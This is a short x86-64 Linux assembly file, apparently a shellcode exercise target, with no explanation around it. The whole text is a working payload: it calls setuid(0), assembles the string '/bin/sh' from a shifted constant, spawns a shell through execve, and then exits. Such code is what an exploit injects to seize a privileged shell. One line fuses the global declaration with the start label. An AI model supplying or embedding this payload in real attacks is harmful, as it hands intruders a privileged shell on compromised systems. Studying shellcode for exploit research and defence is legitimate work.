== Target ASM File: 



section .text
global _start_start:

and rdi,0
mov al , 0x69
syscall
mov rdx, -1
inc rdx
mov  rbx , 0x68732f6e69622fff
shr  rbx , 0x8
push  rbx
push rsp
pop rdi
sub rax,rax
push rax
push rdi
xor rsi, rsi
add rsi, rsp
mov  al , 0x3b
syscall
push 0x1
pop  rdi
push 0x3c
pop  rax
syscall
